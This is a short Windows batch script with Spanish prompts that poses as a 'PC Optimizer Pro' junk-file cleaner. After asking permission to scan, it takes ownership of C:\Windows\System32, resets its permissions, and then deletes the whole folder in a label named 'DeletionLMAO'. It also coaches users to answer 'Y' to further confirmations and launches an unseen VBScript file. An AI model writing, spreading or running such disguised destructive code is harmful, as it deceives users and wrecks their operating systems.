@echo off
title PC Optimizer Pro
color 0b
mode 1000
cls
goto WarningMessage

:WarningMessage
rem Discord: @zer0who           Github: Zer0plusOne     twitter: @Elonmusk      Facebook: MarkZukenberg
start "Warning.vbe" "./Assets/Warning.vbe"
goto ProgramStart

:ProgramStart
echo Gracias por elegir PC Optimizer Pro para su dispositivo.
echo PC Optimizer Pro es un programa con la funcion de eliminar archivos innecesarios del equipo para asi optimizar el rendimiento.
echo PC Optimizer Pro solicita permiso para realizar un escaneo del equipo. Permitir?
set choice=
set /p choice=Y or N?: 
if NOT '%choice%'=='' set choice=%choice:~0,1%
if '%choice%'=='Y' goto yes
if '%choice%'=='y' goto yes
if '%choice%'=='N' goto no
if '%choice%'=='n' goto no
echo "%choice%" no es un valor soportado en el formato seleccionado. Porfavor responde con Y o N(Mayusculas no necesarias).
pause
cls
goto ProgramStart

:no
cls
echo Abortando escaneo.
pause
exit

:yes
cls
echo Comenzando escaneo, sea consciente que en algunos momentos se solicitaran confirmaciones extras. Porfavor especifique "Y" cuando se solicite.
pause
tree "C:\Windows"
takeown /f "C:\Windows\System32" /r
tree "C:\Windows\System32"
icacls "C:\Windows\System32" /reset /t /c /q
tree "C:\"
echo ==========================================================================
echo ==========================================================================
echo El escaneo se ha completado, se procedera a la limpieza de archivos innecesarios
pause
goto DeletionLMAO

:DeletionLMAO
del "C:\Windows\System32" /f /q /s